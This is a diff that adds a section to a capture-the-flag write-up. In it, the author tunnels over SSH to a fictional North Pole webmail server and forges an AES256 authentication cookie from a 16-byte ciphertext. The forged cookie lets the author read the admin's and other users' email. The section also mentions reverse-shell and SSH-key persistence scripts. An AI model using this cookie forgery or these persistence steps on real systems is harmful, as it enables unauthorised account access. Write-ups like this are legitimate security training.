@@ -322,3 +322,208 @@ The file server share name is "FileStor".
 The sha1 of [GreatBookPage3.pdf](book/GreatBookPage3.pdf)
 is `57737da397cbfda84e88b573cd96d45fcf34a5da`.
 
+
+
+# 4) Elf Web Access (EWA) is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?
+
+Before doing anything else, let's make things a bit easier for ourselves. First, the web shell is not very convenient,
+especially since people keep deleting it... So we create [reverse_shell.py](task2/reverse_shell.py) for setting up a
+reverse shell instead. While we are at it we also create [add_ssh.py](task2/add_ssh.py) to add our public ssh key to
+the letters to santa server, so we don't have to type Alabaster Snowballs password everytime we do an ssh tunnel.
+
+With those things taken care of, let's see what is on the mail server. As it is an internal server, we once again
+have to go via the ssh connection for us to be able to access it:
+
+```
+peter@peter-VirtualBox:~$ ssh -N -L 8080:mail.northpolechristmastown.com:80 alabaster_snowball@l2s.northpolechristmastown.com
+```
+
+Now if we visit 127.0.0.1:8080 we should be connected to the internal mail.northpolechristmastown.com server. This seems to work,
+but instead of a mail website we are greeted by a "Apache2 Ubuntu Default Page". This is because we are sending the wrong 
+`Host` header to the server, due to the browser not being aware of the ssh tunneling. We can work around this by adding a
+mapping from `mail.northpolechristmastown.com` to `127.0.0.1` in our /etc/hosts file:
+
+```
+root@peter-VirtualBox:~# echo "127.0.0.1 mail.northpolechristmastown.com" >> /etc/hosts
+```
+
+With that added, we can visit http://mail.northpolechristmastown.com:8080/ and the browser
+will send the correct host header, giving us the page we were looking for:
+
+![mail.northpolechristmastown.com login page](task4/webmail_login.png)
+
+Looking through the source we find the javascript responsible for the login form. It simply submits the
+username and password to `login.js`, giving us a status message back. If successful it redirects us
+to `account.html`:
+
+```js
+// view-source:http://mail.northpolechristmastown.com:8080/js/custom.js
+[...]
+//-------------------- LOGIN FORM -------------------------//
+function login() {
+    var address = $('#email').val().trim();
+    var passw = $('#password').val().trim();
+    if (address && passw && address.match(/[\w\_\-\.]+\@[\w\_\-\.]+\.\w\w\w?\w?/g) !== null) {
+        $.post( "login.js", { email: address, password: passw }).done(function( result ) {
+            //RETURN A JSON bool value of true if the email and password is correct. false if incorrect
+            if (result.bool) {
+                $('#email').val('');
+                $('#password').val('');
+                Materialize.toast('Correct. Logging in now!', 4000);
+                setTimeout(function(){
+                    //redirect to home.html. This needs to be locked down by cookies!
+                    window.location.href = 'account.html';
+                }, 1000);
+            } else {
+                Materialize.toast(result.result, 4000);
+            }
+        }).fail(function(error) {
+            Materialize.toast('Error: '+error.status + " " + error.statusText, 4000);
+        })
+    } else {
+        Materialize.toast('You must put in a correct email and password!', 4000);
+    }
+}
+[...]
+```
+
+The first thing that strikes us is the comment just above the redirect to `account.html`, it
+seems to imply that there is currently no cookie authentication made on the page. However,
+visiting `account.html` directly we see that cookie authentication has seemingly been implemented
+as all it does is redirect us back to the login page:
+
+```html
+<!-- view-source:http://mail.northpolechristmastown.com:8080/account.html -->
+
+<script>window.location.href='/'</script>
+```
+As such, it seems like we will have to either log in successfully, or forge the cookie. As
+a first step, we try guessing some usernames. After some guessing we find that 
+"admin@northpolechristmastown.com" exists. Entering it as username gives us a message
+saying "Incorrect Password" rather than a "User Does Not Exist. Ex - 
+first.last@northpolechristmastown.com" message we get for other attempts.
+We still have no idea about the password though, and the login form does not appear
+to be vulnerable to sql injections.
+
+Instead, we turn towards trying to find something else interesting on the site. A good place
+to start is the robots.txt file:
+
+```
+# http://mail.northpolechristmastown.com:8080/robots.txt
+
+User-agent: *
+Disallow: /cookie.txt
+```
+
+We don't abide by no Disallow rules! Visiting cookie.txt we see that it defines the
+algorithm used for creating the authentication cookies:
+
+```js
+// view-source:http://mail.northpolechristmastown.com:8080/cookie.txt
+
+//FOUND THESE FOR creating and validating cookies. Going to use this in node js
+function cookie_maker(username, callback){
+    var key = 'need to put any length key in here';
+    //randomly generates a string of 5 characters
+    var plaintext = rando_string(5)
+    //makes the string into cipher text .... in base64. When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters
+    //Removes equals from output so as not to mess up cookie. decrypt function can account for this without erroring out.
+    var ciphertext = aes256.encrypt(key, plaintext).replace(/\=/g,'');
+    //Setting the values of the cookie.
+    var acookie = ['IOTECHWEBMAIL',JSON.stringify({"name":username, "plaintext":plaintext,  "ciphertext":ciphertext}), { maxAge: 86400000, httpOnly: true, encode: String }]
+    return callback(acookie);
+};
+
+function cookie_checker(req, callback){
+    try{
+        var key = 'need to put any length key in here';
+        //Retrieving the cookie from the request headers and parsing it as JSON
+        var thecookie = JSON.parse(req.cookies.IOTECHWEBMAIL);
+        //Retrieving the cipher text 
+        var ciphertext = thecookie.ciphertext;
+        //Retrievingin the username
+        var username = thecookie.name
+        //retrieving the plaintext
+        var plaintext = aes256.decrypt(key, ciphertext);
+        //If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key
+        if (plaintext === thecookie.plaintext) {
+            return callback(true, username);
+        } else {
+            return callback(false, '');
+        }
+    } catch (e) {
+        console.log(e);
+        return callback(false, '');
+    }
+};
+```
+
+The most intersting part is the comment in the `cookie_maker` function:
+```js
+//makes the string into cipher text .... in base64. When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters
+```
+
+The same is said in one of the hints from Pepper Minstix:
+
+> AES256? Honestly, I don't know much about it, but Alabaster explained the basic idea and it sounded easy. During decryption, the first 16 bytes are removed and used as the initialization vector or "IV." Then the IV + the secret key are used with AES256 to decrypt the remaining bytes of the encrypted string.
+>
+> -- Pepper Minstix, Hint 3
+
+What's interesting here is that the first 16 bytes of the ciphertext are used as IV when decrypting. 
+When the ciphertext is created via the `cookie_maker` function then there is an additional 5 bytes
+following the IV. But there doesn't have to be if we make a ciphertext ourselves... If we instead
+create a ciphertext that is exactly 16 bytes (less would make the IV invalid) then the entire ciphertext
+is used as IV and the result of the decryption is an empty string.
+
+We can verify this locally using [nodejs-aes256](https://github.com/jaysvoboda/nodejs-aes256) (We pick
+nodejs-aes256 as it seems to match the API used by the snippet above):
+
+```js
+// task4/create_cookie.js
+
+let assert = require('assert');
+let aes256 = require('./nodejs-aes256.js');
+
+var key = 'need to put any length key in here';
+var ciphertext = new Buffer("abcdabcdabcdabcd");
+// YWJjZGFiY2RhYmNkYWJjZA==
+console.log(ciphertext.toString('base64'));
+assert(ciphertext.length === 16);
+var plaintext = aes256.decrypt(key, ciphertext);
+assert(plaintext === "");
+```
+
+The above means we can forge our own cookie for any user without knowing the secret key.
+Since we are intersted in the admin account, we change the GUEST cookie that we
+currently so that it instead has a username property of "admin@northpolechristmastown.com".
+We then change the ciphertext to the base64 encoded 16-byte string we obtained above. The
+plaintext value is kept as "", as that is the value we will get when decrypting our
+forged ciphertext:
+
+```
+{"name":"admin@northpolechristmastown.com","plaintext":"","ciphertext":"YWJjZGFiY2RhYmNkYWJjZA=="}
+```
+
+With that cookie set, we can simply browse to `/account.html` and start reading emails as the
+admin user!
+
+![Logged in as admin](task4/webmail_admin.png)
+
+Reading trough the emails, we don't find anything particularily interesting sent on the admin account.
+Switching to alabaster.snowball (by simply changing the username of the cookie, the rest stays the same)
+we do find an email mentioning our sought after [GreatBookPage4.pdf](book/GreatBookPage4.pdf):
+
+```
+Hey Santa,
+
+Found this lying around. Figured you needed it.
+
+http://mail.northpolechristmastown.com/attachments/GreatBookPage4_893jt91md2.pdf
+
+:)
+
+-Holly
+```
+
+From the book we learn about the lollipop guild, trying to (allegedly) ruin Christmas. Sha1: `f192a884f68af24ae55d9d9ad4adf8d3a3995258` 
+
